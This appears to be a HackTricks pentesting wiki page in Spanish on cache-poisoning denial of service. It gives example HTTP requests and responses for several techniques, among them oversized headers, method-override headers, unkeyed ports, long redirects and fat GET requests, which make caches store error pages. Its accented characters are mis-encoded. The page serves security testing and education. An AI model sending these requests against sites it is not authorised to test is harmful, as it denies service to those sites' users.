# Cache Poisoning to DoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="danger" %}
En esta p√°gina puedes encontrar diferentes variaciones para intentar hacer que el **servidor web responda con errores** a solicitudes que son **v√°lidas para los servidores de cach√©**
{% endhint %}

* **HTTP Header Oversize (HHO)**

Env√≠a una solicitud con un tama√±o de encabezado mayor que el que soporta el servidor web pero menor que el que soporta el servidor de cach√©. El servidor web responder√° con una respuesta 400 que podr√≠a ser almacenada en cach√©:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Character (HMC) y valores inesperados**

Env√≠a un encabezado que contenga algunos **caracteres meta da√±inos** como <script> y </script>. Para que el ataque funcione, primero debes eludir la cach√©.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Un encabezado mal configurado podr√≠a ser solo `\:` como encabezado.

Esto tambi√©n podr√≠a funcionar si se env√≠an valores inesperados, como un Content-Type: inesperado.
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Encabezado sin clave**

Algunos sitios web devolver√°n un c√≥digo de estado de error si **ven algunos encabezados espec√≠ficos** en la solicitud, como con el encabezado _X-Amz-Website-Location-Redirect: someThing_:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP Method Override Attack (HMO)**

Si el servidor admite cambiar el m√©todo HTTP con encabezados como `X-HTTP-Method-Override`, `X-HTTP-Method` o `X-Method-Override`. Es posible solicitar una p√°gina v√°lida cambiando el m√©todo para que el servidor no lo admita, por lo que una mala respuesta se almacena en cach√©:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Puerto sin clave**

Si el puerto en el encabezado Host se refleja en la respuesta y no se incluye en la clave de cach√©, es posible redirigirlo a un puerto no utilizado:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

Como en el siguiente ejemplo, x no est√° siendo almacenado en cach√©, por lo que un atacante podr√≠a abusar del comportamiento de respuesta de redirecci√≥n para hacer que la redirecci√≥n env√≠e una URL tan grande que devuelva un error. Luego, las personas que intenten acceder a la URL sin la clave x no almacenada en cach√© recibir√°n la respuesta de error:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normalizaci√≥n de may√∫sculas en el encabezado Host**

El encabezado Host deber√≠a ser insensible a may√∫sculas, pero algunos sitios web esperan que est√© en min√∫sculas, devolviendo un error si no lo est√°:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Normalizaci√≥n de rutas**

Algunas p√°ginas devolver√°n c√≥digos de error al enviar datos URLencode en la ruta, sin embargo, el servidor de cach√© URLdecodear√° la ruta y almacenar√° la respuesta para la ruta URLdecoded:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Algunos servidores de cach√©, como Cloudflare, o servidores web, detienen las solicitudes GET con un cuerpo, por lo que esto podr√≠a ser abusado para almacenar en cach√© una respuesta inv√°lida:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Referencias

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
